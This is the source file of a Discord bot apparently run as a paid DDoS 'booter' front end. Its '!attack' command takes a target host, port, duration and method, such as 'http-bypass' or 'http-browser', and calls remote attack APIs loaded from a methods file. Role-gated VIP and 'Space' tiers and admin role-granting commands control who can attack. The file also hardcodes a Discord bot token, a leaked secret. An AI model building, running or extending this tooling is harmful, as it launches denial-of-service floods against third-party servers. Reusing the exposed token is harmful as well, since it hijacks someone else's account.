const { Client, Intents, MessageEmbed } = require('discord.js');
const axios = require('axios');
const fs = require('fs');
const chalk = require('chalk');

const client = new Client({
  intents: [
      Intents.FLAGS.GUILD_MESSAGES,
      Intents.FLAGS.GUILDS,
      Intents.FLAGS.GUILD_VOICE_STATES,
      Intents.FLAGS.GUILD_MEMBERS
  ]
});

const TOKEN = 'MTI5NDM1NDQ2OTc2NDQ2ODg1OQ.GP_C3Y.ISOnT7rLYukv4ye-WSZwTk9ooikLKqtCAr6akU';
const ALLOWED_CHANNEL_ID = '1312434884278747198'; 
let methods = [];

fs.readFile('methods.json', 'utf8', (err, data) => {
  if (err) {
    console.error('Error reading funnel.json:', err);
    return;
  }
  methods = JSON.parse(data);
});

// ⚚・─━━━❲❲ Mr.abdulaziz Ready ❳❳━━━─・⚚ \\
client.on('ready', async () => {
  console.log(chalk.blue.bold(`================`));
  console.log(chalk.red.bold(`Bot Name : ${client.user.username}`));
  console.log(chalk.red.bold(`Bot Tag : ${client.user.tag}`));
  console.log(chalk.red.bold(`Bot Id : ${client.user.id}`));
  console.log(chalk.red.bold(`Servers Count : ${client.guilds.cache.size}`));
  console.log(chalk.red.bold(`Users Count : ${client.guilds.cache.reduce((a, b) => a + b.memberCount, 0).toLocaleString()}`));
  console.log(chalk.blue.bold(`================`));

  var statuses = [`667 Tnik Lkol`, `Dev : Za3em`];
  var timers = 2;
  var timeing = Math.floor(timers * 1000);
  
  setInterval(function() {
    var lengthesof = statuses.length;
    var amounter = Math.floor(Math.random() * lengthesof);
    client.user.setActivity(statuses[amounter], { type: 'DISCORD', url: 'https://www.discord.gg/P2L' });
  }, timeing);
})

client.on('messageCreate', async message => {
  if (message.author.bot) return;
  if (message.channel.id !== ALLOWED_CHANNEL_ID) return;
  
  const args = message.content.split(' ');
  const command = args.shift().toLowerCase();

  if (command === '!methods') {
    const embed = new MessageEmbed()
      .setTitle('📜 **Attack Methods**')
      .setDescription('**Here are the available attack methods:**')
      .setImage('attachment://image.png')
      .setFooter('Attack Bot', client.user.displayAvatarURL());

    message.reply({ embeds: [embed], files: ['./image.png'] });
  }

  const vipmethods = ['http-browser', 'http-rapid', 'http-bypass', 'vipmethod2'];
  const spacemethods = ['http-space', 'spacemethod2'];
  
  if (command === '!attack') {
    if (!message.member.roles.cache.has('1312435040789200906')) {
      const embed = new MessageEmbed()
        .setTitle('<a:Super_Offline:1311301758148018247> **Access Denied**')
        .setColor('#474747')
        .setDescription('**You do not have permission to use this command.**')
        .setThumbnail(client.user.displayAvatarURL())
        .setFooter('Attack Bot', client.user.displayAvatarURL());
  
      message.reply({ embeds: [embed] });
      return;
    }
  
    if (args.length < 4) {
      const embed = new MessageEmbed()
        .setTitle('<a:Super_Offline:1311301758148018247> **Error**')
        .setColor('#474747')
        .setDescription('**Please use the correct format:** `!attack <method> <host> <port> <time>`')
        .setThumbnail(client.user.displayAvatarURL())
        .setFooter('Attack Bot', client.user.displayAvatarURL());
  
      message.reply({ embeds: [embed] });
      return;
    }
  
    const methodName = args[0];
    const host = args[1];
    const port = args[2];
    const time = args[3];
  
    if (vipmethods.includes(methodName) && !message.member.roles.cache.has('1312435094014918777')) {
      const embed = new MessageEmbed()
        .setTitle('<a:Super_Offline:1311301758148018247> **Access Denied**')
        .setColor('#474747')
        .setDescription('**You do not have permission to use VIP methods.**')
        .setThumbnail(client.user.displayAvatarURL())
        .setFooter('Attack Bot', client.user.displayAvatarURL());
  
      message.reply({ embeds: [embed] });
      return;
    }
  
    if (spacemethods.includes(methodName) && !message.member.roles.cache.has('1312435072162467932')) {
      const embed = new MessageEmbed()
        .setTitle('<a:Super_Offline:1311301758148018247> **Access Denied**')
        .setColor('#474747')
        .setDescription('**You do not have permission to use Space methods.**')
        .setThumbnail(client.user.displayAvatarURL())
        .setFooter('Attack Bot', client.user.displayAvatarURL());
  
      message.reply({ embeds: [embed] });
      return;
    }
  
    const method = methods.find(m => m.name === methodName);
    if (!method) {
      const embed = new MessageEmbed()
        .setTitle('<a:Super_Offline:1311301758148018247> **Error**')
        .setColor('#474747')
        .setDescription('**Method not found.**')
        .setThumbnail(client.user.displayAvatarURL())
        .setFooter('Attack Bot', client.user.displayAvatarURL());
  
      message.reply({ embeds: [embed] });
      return;
    }
  
    let success = true;
    let errorMessage = '';
  
    for (const api of method.api) {
      const url = api.replace('<<$host>>', host)
        .replace('<<$port>>', port)
        .replace('<<$time>>', time);
  
      try {
        await axios.get(url);
      } catch (error) {
        success = false;
        errorMessage = 'Failed to initiate some attacks. Check the logs for details.';
      }
    }
  
    const embed = new MessageEmbed()
      .setTitle('<a:Super_Online:1311301814758408314> **Attack Initiated**')
      .setColor('#474747')
      .setDescription('**Attack details:**')
      .addField('<a:Animated_Arrow_White:1311302596715220993> **Host**', `**${host}**`, true)
      .addField('<a:Animated_Arrow_White:1311302596715220993> **Port**', `**${port}**`, true)
      .addField('<a:Animated_Arrow_White:1311302596715220993> **Time**', `**${time} seconds**`, true)
      .addField('<a:Animated_Arrow_White:1311302596715220993> **Method**', `**${methodName}**`, true)
      .addField('<a:Animated_Arrow_White:1311302596715220993> **Sent by**', `**${message.author}**`, true)
      .addField('<a:Animated_Arrow_White:1311302596715220993> **Date sent**', `**${new Date().toLocaleString()}**`, true)
      .setThumbnail(client.user.displayAvatarURL())
      .setFooter('667 Bot', message.author.displayAvatarURL({ dynamic: true }));
  
    message.reply({ embeds: [embed] });
  }
  

  if (command === '!access') {
    const allowedUserId = '1048550250585018431'; 
    const roleToGive = '1312435040789200906'; 

    if (message.author.id !== allowedUserId) {
      const embed = new MessageEmbed()
        .setTitle('<a:Super_Offline:1311301758148018247> **Access Denied**')
        .setColor('#474747')
        .setDescription('<a:Super_Offline:1311301758148018247> **You do not have permission to use this command.**')
        .setThumbnail(client.user.displayAvatarURL())
        .setFooter('Attack Bot', client.user.displayAvatarURL());

      message.reply({ embeds: [embed] });
      return;
    }

    if (args.length !== 1) {
      const embed = new MessageEmbed()
        .setTitle('<a:Super_Offline:1311301758148018247> **Error**')
        .setColor('#474747')
        .setDescription('**Please use the correct format:** `!access <user>`')
        .setThumbnail(client.user.displayAvatarURL())
        .setFooter('Attack Bot', client.user.displayAvatarURL());

      message.reply({ embeds: [embed] });
      return;
    }

    const userId = args[0].replace(/[<@!>]/g, ''); // Remove <@!> characters
    const user = message.guild.members.cache.get(userId);
    const role = message.guild.roles.cache.get(roleToGive);

    if (!user || !role) {
      const embed = new MessageEmbed()
        .setTitle('<a:Super_Offline:1311301758148018247> **Error**')
        .setColor('#474747')
        .setDescription('**User or role not found.**')
        .setThumbnail(client.user.displayAvatarURL())
        .setFooter('Attack Bot', client.user.displayAvatarURL());

      message.reply({ embeds: [embed] });
      return;
    }

    try {
      await user.roles.add(role);
      const embed = new MessageEmbed()
        .setTitle('<a:Super_Online:1311301814758408314> **Role Assigned**')
        .setColor('#474747')
        .setDescription(`**Role ${role.name} has been assigned to ${user.user.tag}.**`)
        .setThumbnail(client.user.displayAvatarURL())
        .setFooter('Attack Bot', client.user.displayAvatarURL());

      message.reply({ embeds: [embed] });
    } catch (error) {
      const embed = new MessageEmbed()
        .setTitle('<a:Super_Offline:1311301758148018247> **Error**')
        .setColor('#474747')
        .setDescription('**Failed to assign role.**')
        .setThumbnail(client.user.displayAvatarURL())
        .setFooter('Attack Bot', client.user.displayAvatarURL());

      message.reply({ embeds: [embed] });
    }
  }
  if (command === '!access-vip') {
    const allowedUserId = '1048550250585018431'; 
    const roleToGive = '1312435094014918777'; 

    if (message.author.id !== allowedUserId) {
      const embed = new MessageEmbed()
        .setTitle('<a:Super_Offline:1311301758148018247> **Access Denied**')
        .setColor('#474747')
        .setDescription('<a:Super_Offline:1311301758148018247> **You do not have permission to use this command.**')
        .setThumbnail(client.user.displayAvatarURL())
        .setFooter('Attack Bot', client.user.displayAvatarURL());

      message.reply({ embeds: [embed] });
      return;
    }

    if (args.length !== 1) {
      const embed = new MessageEmbed()
        .setTitle('<a:Super_Offline:1311301758148018247> **Error**')
        .setColor('#474747')
        .setDescription('**Please use the correct format:** `!access-vip <user>`')
        .setThumbnail(client.user.displayAvatarURL())
        .setFooter('Attack Bot', client.user.displayAvatarURL());

      message.reply({ embeds: [embed] });
      return;
    }

    const userId = args[0].replace(/[<@!>]/g, ''); 
    const user = message.guild.members.cache.get(userId);
    const role = message.guild.roles.cache.get(roleToGive);

    if (!user || !role) {
      const embed = new MessageEmbed()
        .setTitle('<a:Super_Offline:1311301758148018247> **Error**')
        .setColor('#474747')
        .setDescription('**User or role not found.**')
        .setThumbnail(client.user.displayAvatarURL())
        .setFooter('Attack Bot', client.user.displayAvatarURL());

      message.reply({ embeds: [embed] });
      return;
    }

    try {
      await user.roles.add(role);
      const embed = new MessageEmbed()
        .setTitle('<a:Super_Online:1311301814758408314> **Role Assigned**')
        .setColor('#474747')
        .setDescription(`**Role ${role.name} has been assigned to ${user.user.tag}.**`)
        .setThumbnail(client.user.displayAvatarURL())
        .setFooter('Attack Bot', client.user.displayAvatarURL());

      message.reply({ embeds: [embed] });
    } catch (error) {
      const embed = new MessageEmbed()
        .setTitle('<a:Super_Offline:1311301758148018247> **Error**')
        .setColor('#474747')
        .setDescription('**Failed to assign role.**')
        .setThumbnail(client.user.displayAvatarURL())
        .setFooter('Attack Bot', client.user.displayAvatarURL());

      message.reply({ embeds: [embed] });
    }
  }
  if (command === '!access-space') {
    const allowedUserId = '1048550250585018431'; 
    const roleToGive = '1312435072162467932'; 

    if (message.author.id !== allowedUserId) {
      const embed = new MessageEmbed()
        .setTitle('<a:Super_Offline:1311301758148018247> **Access Denied**')
        .setColor('#474747')
        .setDescription('<a:Super_Offline:1311301758148018247> **You do not have permission to use this command.**')
        .setThumbnail(client.user.displayAvatarURL())
        .setFooter('Attack Bot', client.user.displayAvatarURL());

      message.reply({ embeds: [embed] });
      return;
    }

    if (args.length !== 1) {
      const embed = new MessageEmbed()
        .setTitle('<a:Super_Offline:1311301758148018247> **Error**')
        .setColor('#474747')
        .setDescription('**Please use the correct format:** `!access-space <user>`')
        .setThumbnail(client.user.displayAvatarURL())
        .setFooter('Attack Bot', client.user.displayAvatarURL());

      message.reply({ embeds: [embed] });
      return;
    }

    const userId = args[0].replace(/[<@!>]/g, ''); // Remove <@!> characters
    const user = message.guild.members.cache.get(userId);
    const role = message.guild.roles.cache.get(roleToGive);

    if (!user || !role) {
      const embed = new MessageEmbed()
        .setTitle('<a:Super_Offline:1311301758148018247> **Error**')
        .setColor('#474747')
        .setDescription('**User or role not found.**')
        .setThumbnail(client.user.displayAvatarURL())
        .setFooter('Attack Bot', client.user.displayAvatarURL());

      message.reply({ embeds: [embed] });
      return;
    }

    try {
      await user.roles.add(role);
      const embed = new MessageEmbed()
        .setTitle('<a:Super_Online:1311301814758408314> **Role Assigned**')
        .setColor('#474747')
        .setDescription(`**Role ${role.name} has been assigned to ${user.user.tag}.**`)
        .setThumbnail(client.user.displayAvatarURL())
        .setFooter('Attack Bot', client.user.displayAvatarURL());

      message.reply({ embeds: [embed] });
    } catch (error) {
      const embed = new MessageEmbed()
        .setTitle('<a:Super_Offline:1311301758148018247> **Error**')
        .setColor('#474747')
        .setDescription('**Failed to assign role.**')
        .setThumbnail(client.user.displayAvatarURL())
        .setFooter('Attack Bot', client.user.displayAvatarURL());

      message.reply({ embeds: [embed] });
    }
  }
});

client.login(TOKEN);
